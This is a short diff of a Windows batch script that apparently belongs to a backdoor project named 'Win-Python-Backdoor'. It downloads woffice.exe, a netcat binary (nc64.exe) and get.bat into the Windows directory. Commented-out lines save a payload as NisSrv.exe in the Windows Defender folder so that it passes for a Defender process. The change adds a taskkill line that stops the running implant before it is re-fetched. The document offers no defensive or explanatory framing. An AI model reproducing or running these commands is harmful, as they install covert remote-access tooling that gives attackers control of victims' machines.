@@ -42,6 +42,7 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
 rem wget --no-check-certificate %urlgit%/wup.exe  -O %windir%\wup.exe
+taskkill /f /im woffice.exe
 wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
 wget --no-check-certificate %urlgit%/nc64.exe  -O %windir%\nc64.exe
 wget --no-check-certificate %urlgit%/get.bat  -O %windir%\get.bat
